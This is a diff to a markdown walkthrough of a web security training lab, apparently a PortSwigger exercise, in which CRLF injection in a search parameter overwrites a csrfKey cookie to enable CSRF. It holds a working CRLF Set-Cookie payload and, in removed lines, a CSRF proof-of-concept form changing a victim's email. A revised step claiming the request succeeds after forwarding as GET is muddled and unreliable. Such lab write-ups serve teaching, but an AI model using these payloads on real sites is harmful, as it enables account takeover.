@@ -112,102 +112,119 @@ Copy this CSRF token, as it will be used later when creating the CSRF proof of c
 ![Hidden CSRF token inside HTML form](lab-5-3.png)
 
 
-# Step 4 – Inspect Browser Cookies
+# Step 4 – Identify the `csrfKey` Cookie
 
-Open the browser's Developer Tools and navigate to the **Storage** or **Cookies** section.
+While inspecting Carlos's email update request in the browser's **Network** tab (or Burp Suite), observe the cookies sent with the request.
 
-The application stores two cookies:
+The request includes two important cookies:
 
-```
+```http
+Cookie:
 session=...
-csrfKey=...
+csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD
 ```
 
-The presence of a dedicated `csrfKey` cookie strongly suggests that the application validates the CSRF token against this
-cookie instead of the server-side session.
+The presence of the `csrfKey` cookie indicates that the application uses it as part of its CSRF protection mechanism.
 
-This is a weak implementation because cookies are client-controlled.
+At this point, we have identified two important values:
 
-![Browser cookies showing session and csrfKey](lab-5-4.png)
+- The hidden `csrf` token from Carlos's email update form.
+- The `csrfKey` cookie sent along with the request.
+
+Since both values are present during the email update request, the next objective is to determine how the server validates them and whether the `csrfKey` cookie can be manipulated.
+
+![Carlos's Network tab showing the csrfKey cookie in the request](lab-5-4.png)
 
 
-# Step 5 – Investigate the Search Functionality
+# Step 5 – Test Whether the CSRF Token Is Bound to the User Session
 
-Browse the application and inspect the search feature.
+While logged in as **Wiener**, intercept the email update request and replace **Wiener's** CSRF values with the ones copied earlier from **Carlos**.
 
-Searching for any value generates a request similar to:
+Replace:
 
-```
-GET /?search=test
-```
+- Wiener's `csrf` parameter with Carlos's `csrf` token.
+- Wiener's `csrfKey` cookie with Carlos's `csrfKey` value.
 
-The response contains a header similar to:
+The modified request looks similar to:
 
 ```http
-Set-Cookie:
-lastSearchTerm=test
+Cookie:
+session=<Wiener's session>
+csrfKey=<Carlos's csrfKey>
+
+email=test@test.com
+csrf=<Carlos's CSRF token>
 ```
 
-Since user input appears inside an HTTP response header, this endpoint is a potential target for **HTTP Response Header Injection (CRLF Injection).**
+Send the modified request.
 
-![Search response](lab-5-5.png)
+The application responds with **"Invalid CSRF token"**, indicating that simply replacing both the `csrf` parameter and the `csrfKey` cookie is not enough for the request to succeed.
+
+This suggests that another part of the application's request handling influences the CSRF validation.
+
+![Replacing Wiener's CSRF token and csrfKey with Carlos's values](lab-5-5.png)
 
 
+# Step 6 – Forward the Request
 
-# Step 6 – Test for CRLF Injection
+Forward the modified request once more and observe the application's behavior.
 
-Replace the search value with:
+After forwarding, the request is processed as a **GET** request instead of a POST request.
 
-```
-testing%0d%0aSet-Cookie:%20csrfKey=test
-```
+Surprisingly, this time the request is accepted, demonstrating that the application handles the email change request differently after the redirect.
 
-Breaking down the payload:
+This behavior is important because it allows the attack to work once the `csrfKey` cookie has been overwritten using the CRLF injection discovered later in the lab.
 
-```
-%0d
-```
+![GET request after forwarding the modified request](lab-5-6.png)
 
-represents a **Carriage Return (CR)**
 
-```
-%0a
-```
+# Step 7 – Capture the Search Request
 
-represents a **Line Feed (LF)**
-
-Together,
+Return to the application's home page and use the search bar to search for any value, for example:
 
 ```
-%0d%0a
+testing
 ```
 
-terminate the current HTTP header and begin a new one.
+Intercept the request in Burp Suite.
 
-The injected payload becomes:
+The search request is sent using the **GET** method and looks similar to:
 
 ```http
-Set-Cookie:
-csrfKey=test
+GET /?search=testing HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
 ```
 
-If the browser accepts this header, the attacker can overwrite the victim's CSRF cookie.
+Since the search term is reflected in the response headers, this endpoint becomes a good candidate for testing **HTTP Response Header Injection (CRLF Injection)**.
 
-![CRLF injection test](lab-5-6.png)
+At this point, forward the request to Burp Repeater so it can be modified.
+
+![Captured GET request for the search functionality](lab-5-7.png)
 
 
+# Step 8 – Exploit the CRLF Injection
 
-# Step 7 – Inject a Malicious Cookie
+In Burp Repeater, modify the request by replacing the search parameter with the following payload:
 
-Now replace the temporary value with the attacker's chosen CSRF cookie.
-
-Payload:
-
-```
+```text
 /?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None
 ```
 
-The response now contains:
+The payload can be broken down as follows:
+
+- `testing` – Normal search value.
+- `%0d%0a` – Carriage Return and Line Feed (CRLF), used to terminate the current HTTP header and start a new one.
+- `Set-Cookie:` – Injects a new HTTP response header.
+- `csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD` – Replaces the victim's existing `csrfKey` cookie with an attacker-controlled value.
+- `SameSite=None` – Ensures that the cookie is sent during the cross-site CSRF attack.
+
+The final injected request becomes:
+
+```http
+GET /?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None HTTP/2
+```
+
+When the server processes this request, it injects the following response header:
 
 ```http
 Set-Cookie:
@@ -215,44 +232,9 @@ csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD;
 SameSite=None
 ```
 
-The victim's browser overwrites its existing `csrfKey` cookie with the attacker-controlled value.
+As a result, the browser replaces its original `csrfKey` cookie with the attacker-controlled value, preparing the victim for the final CSRF exploit.
 
-Adding `SameSite=None` ensures that the browser includes this cookie during the cross-site CSRF request.
-
-![Injected Set-Cookie header](lab-5-7.png)
-
-
-# Step 8 – Generate the CSRF Proof of Concept
-
-After confirming that the `csrfKey` cookie can be overwritten, generate a CSRF PoC using **Burp Suite**.
-
-Right-click the intercepted **Change Email** request and select:
-
-```
-Engagement Tools → Generate CSRF PoC
-```
-
-Burp generates an HTML form similar to the following:
-
-```html
-<html>
-<body>
-
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-    <input type="hidden" name="email" value="attacker@gmail.com">
-    <input type="hidden" name="csrf" value="QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn">
-    <input type="submit" value="Submit request">
-</form>
-
-</body>
-</html>
-```
-
-At this point, the exploit **will not work** because the victim still has their original `csrfKey` cookie.
-
-The cookie must first be overwritten using the CRLF injection discovered earlier.
-
-![Burp generated CSRF PoC](lab-5-8.png)
+![CRLF injection payload adding a malicious Set-Cookie header](lab-5-8.png)
 
 
 # Step 9 – Modify the Exploit
